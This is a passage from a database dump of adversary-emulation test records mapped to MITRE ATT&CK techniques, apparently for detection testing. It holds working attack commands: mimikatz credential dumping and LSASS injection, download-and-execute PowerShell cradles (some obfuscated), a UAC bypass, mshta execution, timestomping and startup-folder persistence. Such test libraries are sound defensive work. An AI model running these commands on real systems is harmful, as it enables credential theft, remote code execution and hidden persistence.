/id:500\\" \\"exit\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remote Process Injection in LSASS via mimikatz", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{psexec_path}\\") { exit 0} else { exit 1}\\n"], "input_arguments": [{"key": "machine", "value": "DC1"}, {"key": "mimikatz_path", "value": "%tmp%\\\\mimikatz\\\\x64\\\\mimikatz.exe"}, {"key": "psexec_path", "value": "C:\\\\PSTools\\\\PsExec.exe"}], "execution_status": "Pass"}, {"cleanup": "Stop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1055.012\\\\src\\\\T1055.012-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Exploit\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "RunPE via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{exe_binary}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Process Injection via C#", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "exe_binary", "value": "PathToAtomicsFolder\\\\T1055.004\\\\bin\\\\T1055.exe"}], "execution_status": "Pass"}, {"cleanup": "reg delete \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Security\\" /f\\ndel %APPDATA%\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\\n", "command": ["reg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Security\\" /t REG_DWORD /d 4\\nif not exist  %APPDATA%\\\\Microsoft\\\\Outlook ( md %APPDATA%\\\\Microsoft\\\\Outlook\\\\ )\\necho \\"Atomic Red Team TEST\\" > %APPDATA%\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Office Application Startup - Outlook as a C2", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
248	\N		\N	yes		\N	2021-07-09 12:23:53.031684+00	T1546.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Invoke-AtomicTest T1546.001 -Cleanup", "command": ["Invoke-AtomicTest T1546.001 -TestNumbers 1"], "executor": ["pwsh"], "platform": "Windows", "file_name": "T1546.001.yml", "pre_command": [], "ability_name": "", "created_date": "02/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Invoke-AtomicTest T1546.001 -GetPrereqs"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
169	\N		\N	yes	P2	\N	2021-07-30 03:12:32.392835+00	T1070.006	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.782Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -a -t 197001010000.00 #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's access timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -m -t 197001010000.00 #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's modification timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["NOW=$(date)\\ndate -s \\"1970-01-01 00:00:00\\"\\ntouch #{target_filename}\\ndate -s \\"$NOW\\"\\nstat #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's creation timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -acmr #{reference_file_path} #{target_file_path}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Modify file timestamps using reference file", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_file_path", "value": "/opt/filename"}, {"key": "reference_file_path", "value": "/bin/sh"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.CreationTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file creation timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastWriteTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last modified timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastAccessTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last access timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\timestomp.ps1 -ErrorAction Ignore\\nRemove-Item #{file_path}\\\\kxwn.lock -ErrorAction Ignore", "command": ["import-module #{file_path}\\\\timestomp.ps1\\ntimestomp -dest \\"#{file_path}\\\\kxwn.lock\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Timestomp a File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path -path \\"#{file_path}\\\\kxwn.lock\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "$env:appdata\\\\Microsoft"}], "execution_status": "Pass"}]}}}}
133	\N		powershell	yes	P1	\N	2021-07-27 10:10:24.416892+00	T1547.009	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["$Shell = New-Object -ComObject (\\"WScript.Shell\\")\\n            $ShortCut = $Shell.CreateShortcut(\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1023.lnk\\")\\n            $ShortCut.TargetPath=\\"cmd.exe\\"\\n            $ShortCut.WorkingDirectory = \\"C:\\\\Windows\\\\System32\\";\\n            $ShortCut.WindowStyle = 1;\\n            $ShortCut.Description = \\"T1023.\\";\\n            $ShortCut.Save()\\n\\n            # ProgramData File\\n            $Shell = New-Object -ComObject (\\"WScript.Shell\\")\\n            $ShortCut = $Shell.CreateShortcut(\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1023.lnk\\")\\n            $ShortCut.TargetPath=\\"cmd.exe\\"\\n            $ShortCut.WorkingDirectory = \\"C:\\\\Windows\\\\System32\\";\\n            $ShortCut.WindowStyle = 1;\\n            $ShortCut.Description = \\"T1023.\\";\\n            $ShortCut.Save()"], "executor": ["powershell"], "platform": "", "file_name": null, "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.210Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "del -f #{shortcut_file_path} >nul 2>&1\\n", "command": ["echo [InternetShortcut] > #{shortcut_file_path}\\necho URL=C:\\\\windows\\\\system32\\\\calc.exe >> #{shortcut_file_path}\\n#{shortcut_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Shortcut Modification", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "shortcut_file_path", "value": "%temp%\\\\T1547.009_modified_shortcut.url"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\" -ErrorAction Ignore\\nRemove-Item \\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\" -ErrorAction Ignore\\n", "command": ["$Shell = New-Object -ComObject (\\"WScript.Shell\\")\\n$ShortCut = $Shell.CreateShortcut(\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\")\\n$ShortCut.TargetPath=\\"cmd.exe\\"\\n$ShortCut.WorkingDirectory = \\"C:\\\\Windows\\\\System32\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\"T1547.009.\\";\\n$ShortCut.Save()\\n\\n$Shell = New-Object -ComObject (\\"WScript.Shell\\")\\n$ShortCut = $Shell.CreateShortcut(\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\")\\n$ShortCut.TargetPath=\\"cmd.exe\\"\\n$ShortCut.WorkingDirectory = \\"C:\\\\Windows\\\\System32\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\"T1547.009.\\";\\n$ShortCut.Save()\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create shortcut to cmd in startup folders", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
246	\N		\N	yes		\N	2021-06-30 10:16:42.514529+00	T1033	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Invoke-AtomicTest T1033 -Cleanup", "command": ["Invoke-AtomicTest T1033 -TestNumbers 1", "2"], "executor": ["pwsh"], "platform": " Windows", "file_name": "T1033.yml", "pre_command": ["Invoke-AtomicTest T1003 -CheckPrereqs"], "ability_name": "", "created_date": "30/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Invoke-AtomicTest T1033 -GetPrereqs"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Invoke-AtomicTest T1033 -Cleanup", "command": ["Invoke-AtomicTest T1033 -TestNumbers 1", "2"], "executor": ["pwsh"], "platform": " Windows", "file_name": "T1033.yml", "pre_command": ["Invoke-AtomicTest T1033 -CheckPrereqs"], "ability_name": "", "created_date": "30/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Invoke-AtomicTest T1033 -GetPrereqs"], "input_arguments": [], "execution_status": "Pass"}]}}}}
221	\N		\N	yes	P2  P2	\N	2021-08-30 12:50:27.924247+00	T1059.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "del /f MuddyWater_T1059_001.bat", "command": ["@ECHO OFF\\\\n\\\\nshell Invoke-Command {Invoke-Exp{Invoke-Expression \\\\\\\\'&\\\\\\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\notepad.exe\\\\\\"\\\\\\\\'}"], "executor": ["cmd"], "platform": "Windows", "file_name": "MuddyWater_T1059_001.bat", "pre_command": [], "ability_name": "", "created_date": "24/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["MuddyWater_T1059_001.bat"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "del /f Powershell.exe", "command": ["Powershell.exe -i"], "executor": ["cmd"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "24/06/2021", "post_command": ["get-date"], "modified_date": "", "pre-requisite": ["Powershell.exe"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "del /f PowerShell", "command": ["rundll32 PowerShell", "main"], "executor": ["Cmd"], "platform": "Windows", "file_name": "PowerShell", "pre_command": [], "ability_name": "", "created_date": "24/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["PowerShdll"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\acrocef_low\\\\Load-Assemblies.ps1", "command": ["Invoke-WebRequest https://www.powershellgallery.com/packages/powershell-yaml/0.4.1/Content/Load-Assemblies.ps1 -OutFile \\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\acrocef_low\\\\Load-Assemblies.ps1\\""], "executor": ["pwsh"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "24/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Load-Assemblies.ps1"], "input_arguments": [], "execution_status": "Pass"}], "caldera": [{"cleanup": "", "command": ["Powershell.exe \\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\""], "executor": "cmd", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Command and Scripting Interpreter: PowerShell", "created_date": "03/08/2021", "post_command": [], "modified_date": "03/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "", "command": ["powershell.exe \\"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mimikatz", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "mimurl", "value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["write-host \\"Import and Execution of SharpHound.ps1 from #{file_path}\\" -ForegroundColor Cyan\\nimport-module #{file_path}\\\\SharpHound.ps1\\nInvoke-BloodHound -OutputDirectory $env:Temp\\nStart-Sleep 5\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Run BloodHound from local disk", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["if (Test-Path #{file_path}\\\\SharpHound.ps1) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "PathToAtomicsFolder\\\\T1059.001\\\\src"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["write-host \\"Remote download of SharpHound.ps1 into memory", " followed by execution of the script\\" -ForegroundColor Cyan\\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\\nInvoke-BloodHound -OutputDirectory $env:Temp\\nStart-Sleep 5\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Run Bloodhound from Memory using Download Cradle", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e'", "'Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e'", "'Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct'", "$TRUE", "1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value", "(GV gH).Value);&( ''.IsNormalized.ToString()[13", "15", "48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Obfuscation Tests", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\\\Software\\\\Microsoft\\\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY'", "([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5])", "@('StatusBar'", "0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url", "(' '*1000)", "'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a'", "'^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f'", "'x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}'", "'~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY'", "'iWindowPosDX'", "'iWindowPosY'", "'iWindowPosX'", "'StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mimikatz - Cradlecraft PsSendKeys", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["Powershell.exe \\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-AppPathBypass", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["powershell.exe -exec bypass -noprofile \\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET'", "'#{url}'", "$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell MsXml COM object - with prompt", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\" -exec bypass -noprofile \\"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell XML requests", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell invoke mshta.exe download", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:Temp\\\\*BloodHound.zip -Force\\n", "command": ["C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\\"\\n"], "executor": "manual", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell Invoke-DownloadCradle", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item -path C:\\\\Windows\\\\Temp\\\\art-marker.txt -Force -ErrorAction Ignore\\nRemove-Item HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam -Force -ErrorAction Ignore\\n", "command": ["# Encoded payload in next command is the following \\"Set-Content -path \\"$env:SystemRoot/Temp/art-marker.txt\\" -value \\"Hello from the Atomic Red Team\\"\\"\\nreg.exe add \\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\AtomicRedTeam\\" /v ART /t REG_SZ /d \\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\"\\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam').ART)))\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell Fileless Script Execution", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item -path C:\\\\Windows\\\\Temp\\\\art-marker.txt -Force -ErrorAction Ignore\\nRemove-Item HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam -Force -ErrorAction Ignore\\n", "command": ["powershell.exe -version 2 -Command Write-Host $PSVersion\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell Downgrade Attack", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["Add-Content -Path #{ads_file} -Value 'Write-Host \\"Stream Data Executed\\"' -Stream 'streamCommand'\\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\\nInvoke-Expression $streamcommand\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "NTFS Alternate Data Stream Access", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \\"NTFS\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "ads_file", "value": "$env:TEMP\\\\NTFS_ADS.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["New-PSSession -ComputerName #{hostname_to_connect}\\nTest-Connection $env:COMPUTERNAME\\nSet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use -Value \\"T1086 PowerShell Session Creation and Use\\"\\nGet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\nRemove-Item -Force $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell Session Creation and Use", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["Try {\\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\\n    exit 0\\n} \\nCatch {\\n    exit 1\\n}\\n"], "input_arguments": [{"key": "hostname_to_connect", "value": "$env:COMPUTERNAME"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ATHPowerShellCommandLineParameter -Command parameter variations", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "command_line_switch_type", "value": "Hyphen"}, {"key": "command_param_variation", "value": "C"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "command_line_switch_type", "value": "Hyphen"}, {"key": "command_param_variation", "value": "C"}, {"key": 